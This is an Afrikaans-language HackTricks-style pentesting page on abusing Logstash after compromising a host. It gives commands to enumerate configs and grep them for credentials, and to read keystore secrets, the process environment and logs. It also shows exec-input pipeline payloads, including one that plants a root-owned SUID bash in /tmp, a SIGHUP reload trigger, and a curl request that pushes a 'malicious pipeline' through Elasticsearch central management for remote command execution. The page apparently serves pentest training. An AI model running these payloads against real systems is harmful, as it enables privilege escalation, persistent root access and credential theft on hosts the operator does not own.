# Logstash-voorregeskalasie

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash word gebruik om **logs te versamel, te transformeer en te versend** deur ’n stelsel bekend as **pipelines**. Hierdie pipelines bestaan uit **input-, filter- en output-fases**.<sup>[[4]](#references)</sup> ’n Interessante aspek ontstaan wanneer Logstash op ’n gekompromitteerde masjien werk.

### Pipeline-konfigurasie

Op Debian- en RPM-pakketinstallasies word pipelines gekonfigureer via **/etc/logstash/pipelines.yml**, wat die liggings van die pipeline-konfigurasies lys; ander distribusies plaas `pipelines.yml` in die Logstash `path.settings`-gids.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hierdie lêer onthul waar die **.conf**-lêers wat pipeline-konfigurasies bevat, geleë is. Wanneer ’n **Elasticsearch output** gebruik word, ondersoek die `user`/`password`-, `cloud_auth`- of `api_key`-instellings; die rekening se effektiewe privileges hang van Elasticsearch af. ’n `path.config`-glob laai elke ooreenstemmende lêer vir daardie pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

As Logstash met `-f <directory>` in plaas van `pipelines.yml` begin word, kry `-f` voorkeur en **alle lêers binne daardie directory word in leksikografiese volgorde aaneengeskakel en as ’n enkele config geparse**.<sup>[[6]](#references)[[7]](#references)</sup> Dit skep 2 offensiewe implikasies:

- ’n Lêer soos `000-input.conf` of `zzz-output.conf` wat geplaas word, kan verander hoe die finale pipeline saamgestel word
- ’n Foutiewe lêer kan veroorsaak dat die gekombineerde config-validasie misluk; tydens herlaai behou Logstash die vorige pipeline, dus moet payloads gevalideer word voordat daar op auto-reload staatgemaak word.<sup>[[1]](#references)</sup>

### Vinnige Enumerasie op ’n Gekompromitteerde Host

Op ’n host waarop Logstash geïnstalleer is, inspekteer vinnig:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Kontroleer ook of die plaaslike monitoring API bereikbaar is. By verstek bind dit aan **127.0.0.1:9600**, wat gewoonlik genoeg is nadat jy op die host geland het.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Hierdie endpoints stel pipeline-ID's en instellings, runtime-metrieke en tellers vir die sukses/mislukking van config-herlaai bloot, wat help om te bevestig of 'n verandering aanvaar is.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

As 'n herwonne credential **Elasticsearch** teiken, kyk na [hierdie ander bladsy oor Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Om privilege escalation te probeer, identifiseer eers die gebruiker waaronder die Logstash-diens werklik loop; moenie aanvaar dat dit root of die **logstash**-gebruiker is nie. Maak seker dat jy aan **een** van hierdie kriteria voldoen:

- Beskik oor **skryftoegang** tot 'n pipeline-**.conf**-lêer **of**
- Die **/etc/logstash/pipelines.yml**-lêer gebruik 'n wildcard, en jy kan na die teikenvouer skryf.<sup>[[6]](#references)[[7]](#references)</sup>

Daarbenewens moet **een** van hierdie voorwaardes vervul wees:

- Vermoë om die Logstash-diens te herbegin **of**
- Die **/etc/logstash/logstash.yml**-lêer het **config.reload.automatic: true** gestel.<sup>[[1]](#references)[[15]](#references)</sup>

Gegewe 'n wildcard in die konfigurasie, laat die skep van 'n lêer wat by hierdie wildcard pas, command execution toe.<sup>[[7]](#references)[[9]](#references)</sup> Byvoorbeeld:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bepaal **interval** die uitvoeringsfrekwensie in sekondes. In die gegewe voorbeeld loop die **whoami**-opdrag elke 120 sekondes, met die uitvoer wat na **/tmp/output.log** gerig word.<sup>[[9]](#references)</sup>

Met **config.reload.automatic: true** in **/etc/logstash/logstash.yml** sal Logstash outomaties nuwe of gewysigde pipeline-konfigurasies bespeur en toepas sonder dat dit herbegin hoef te word.<sup>[[1]](#references)[[15]](#references)</sup> Indien daar geen wildcard is nie, kan bestaande konfigurasies steeds gewysig word, maar versigtigheid word aangeraai om ontwrigtings te voorkom.

### Meer Betroubare Pipeline Payloads

Die `exec` input plugin werk steeds in huidige releases en vereis óf ’n `interval` óf ’n `schedule`. Dit voer uit deur die Logstash JVM te **fork**, dus kan jou payload met `ENOMEM` misluk indien geheue beperk is, eerder as om stilweg te loop.<sup>[[9]](#references)</sup>

Wanneer die diens voldoende voorregte het om ’n root-owned SUID-lêer te skep, is ’n praktiese privilege-escalation payload een wat ’n duursame artefak agterlaat:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
As jy nie herbeginregte het nie maar die proses kan sein, ondersteun Logstash ook ’n **SIGHUP**-geaktiveerde herlaai op Unix-agtige stelsels:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Wees bewus daarvan dat nie elke plugin herlaaivriendelik is nie. Byvoorbeeld, die **stdin**-input verhoed outomatiese herlaai, dus moenie aanvaar dat `config.reload.automatic` altyd jou veranderinge sal optel nie.<sup>[[1]](#references)</sup>

### Steel van Secrets uit Logstash

Voordat jy slegs op code execution fokus, versamel die data waartoe Logstash reeds toegang het:

- Credentials kan in `elasticsearch {}`-outputs, `http_poller`-URL's/settings, JDBC-inputs of cloud-verwante settings voorkom; hierdie plugins stel credential-velde bloot wat die moeite werd is om voor te soek.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings kan in **`/etc/logstash/logstash.keystore`** of 'n ander `path.settings`-directory voorkom.<sup>[[5]](#references)[[10]](#references)</sup>
- Die keystore-wagwoord kan deur **`LOGSTASH_KEYSTORE_PASS`** verskaf word, en RPM/DEB-installasies laai diens-omgewingsveranderlikes uit **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Omgewingsveranderlike-uitbreiding met `${VAR}` word tydens Logstash-startup opgelos, dus is die diens se omgewing die moeite werd om te inspekteer.<sup>[[14]](#references)</sup>

Nuttige kontroles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Dit is ook die moeite werd om na te gaan, omdat **CVE-2023-46672** getoon het dat Logstash onder spesifieke omstandighede sensitiewe inligting in sy logs aangeteken het, insluitend geheime wat in sy keystore gestoor en vanuit die konfigurasie verwys is; hersien ou Logstash-logs en `journald`-inskrywings indien daardie omstandighede moontlik van toepassing is.<sup>[[3]](#references)</sup>

### Misbruik van gesentraliseerde Pipeline Management

In sommige omgewings maak die host glad nie op plaaslike `.conf`-lêers staat nie. Indien **`xpack.management.enabled: true`** gekonfigureer is, kan Logstash sentraal bestuurde pipelines vanaf Elasticsearch/Kibana ophaal, en nadat hierdie modus geaktiveer is, is plaaslike pipeline-konfigurasies nie meer die bron van waarheid nie.<sup>[[2]](#references)</sup>

Dit beteken ’n ander aanvalspad:

1. Herwin Elastic-geloofsbriewe uit plaaslike Logstash-instellings, die keystore of logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Verifieer of die rekening die **`manage_logstash_pipelines`**-cluster privilege het.<sup>[[16]](#references)</sup>
3. Skep of vervang ’n sentraal bestuurde pipeline sodat die Logstash-host jou payload tydens sy volgende poll-interval uitvoer.<sup>[[2]](#references)[[16]](#references)</sup>

Die Elasticsearch API wat vir hierdie funksie gebruik word, is:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Dit is veral nuttig wanneer plaaslike lêers leesalleen is, maar Logstash reeds geregistreer is om pipelines op afstand te gaan haal.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic-dokumentasie: Herlaai die konfigurasielêer](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic-dokumentasie: Stel gesentraliseerde pipeline-bestuur op](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1-sekuriteitsopdatering (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic-dokumentasie: Skep ’n Logstash-pipeline](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic-dokumentasie: Logstash-gidsuitleg](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic-dokumentasie: Veelvuldige pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic-dokumentasie: Voer Logstash vanaf die command line uit](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic-dokumentasie: Monitor Logstash met APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic-dokumentasie: Exec-invoerplugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic-dokumentasie: Secrets-keystore vir veilige instellings](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic-dokumentasie: Elasticsearch-uitvoerplugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic-dokumentasie: Http_poller-invoerplugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic-dokumentasie: Jdbc-invoerplugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic-dokumentasie: Gebruik omgewingsveranderlikes](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic-dokumentasie: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Skep of dateer ’n Logstash-pipeline op](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Kry instellings vir pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Kry statistieke vir pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
